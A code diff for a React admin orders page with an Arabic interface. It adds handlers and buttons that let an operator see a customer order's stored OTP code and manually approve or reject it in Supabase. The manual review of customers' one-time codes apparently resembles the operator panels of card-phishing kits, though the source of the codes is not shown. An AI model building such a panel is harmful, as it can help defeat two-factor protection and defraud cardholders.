@@ -175,6 +175,61 @@ const AdminOrders = () => {
     }
   };
 
+  const handleOtpApprove = async (sequenceNumber: string) => {
+    setProcessingOrder(sequenceNumber);
+    try {
+      const { error } = await supabase
+        .from("customer_orders")
+        .update({ 
+          status: "completed",
+          otp_verified: true 
+        })
+        .eq("sequence_number", sequenceNumber);
+
+      if (error) throw error;
+
+      toast({
+        title: "تمت الموافقة",
+        description: "تم قبول رمز التحقق بنجاح",
+      });
+    } catch (error) {
+      console.error("Error approving OTP:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء الموافقة على رمز التحقق",
+        variant: "destructive",
+      });
+    } finally {
+      setProcessingOrder(null);
+    }
+  };
+
+  const handleOtpReject = async (sequenceNumber: string) => {
+    setProcessingOrder(sequenceNumber);
+    try {
+      const { error } = await supabase
+        .from("customer_orders")
+        .update({ status: "otp_rejected" })
+        .eq("sequence_number", sequenceNumber);
+
+      if (error) throw error;
+
+      toast({
+        title: "تم الرفض",
+        description: "تم رفض رمز التحقق",
+      });
+    } catch (error) {
+      console.error("Error rejecting OTP:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء رفض رمز التحقق",
+        variant: "destructive",
+      });
+    } finally {
+      setProcessingOrder(null);
+    }
+  };
+
   return (
     <SidebarProvider>
       <div className="min-h-screen flex w-full">
@@ -388,6 +443,37 @@ const AdminOrders = () => {
                                 <X className="h-4 w-4 ml-2" />
                               )}
                               عدم الموافقة
+                            </Button>
+                          </div>
+                        )}
+
+                        {/* OTP Approval/Rejection Actions */}
+                        {order.status === "waiting_otp_approval" && order.otp_code && (
+                          <div className="flex gap-3 pt-4 border-t border-border">
+                            <Button
+                              onClick={() => handleOtpApprove(order.sequence_number)}
+                              disabled={processingOrder === order.sequence_number}
+                              className="flex-1 bg-green-600 hover:bg-green-700"
+                            >
+                              {processingOrder === order.sequence_number ? (
+                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                              ) : (
+                                <Check className="h-4 w-4 ml-2" />
+                              )}
+                              الموافقة على رمز التحقق
+                            </Button>
+                            <Button
+                              onClick={() => handleOtpReject(order.sequence_number)}
+                              disabled={processingOrder === order.sequence_number}
+                              variant="destructive"
+                              className="flex-1"
+                            >
+                              {processingOrder === order.sequence_number ? (
+                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                              ) : (
+                                <X className="h-4 w-4 ml-2" />
+                              )}
+                              رفض رمز التحقق
                             </Button>
                           </div>
                         )}
